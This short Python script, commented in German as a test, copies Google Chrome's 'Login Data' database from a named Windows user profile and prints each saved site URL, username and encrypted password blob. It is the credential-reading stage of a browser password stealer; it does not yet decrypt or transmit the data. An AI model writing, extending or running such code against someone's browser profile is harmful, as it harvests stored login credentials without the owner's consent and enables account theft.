#  Test, um zu schauen ob uRL, CipherText und Username mitgeliefert werden
#Chrome username & password file path
import shutil
import sqlite3
chrome_path_login_db = (r"C:\Users\keanu\AppData\Local\Google\Chrome\User Data\Default\Login Data")
shutil.copy2(chrome_path_login_db, "Loginvault.db") 
#Connect to sqlite database
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
#Select statement to retrieve info 
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
for index,login in enumerate(cursor.fetchall()):
    url = login[0]
    username = login[1]
    ciphertext= login[2]
    print("Url:",url)
    print("Username",username)
    print("Cipher Text",ciphertext)
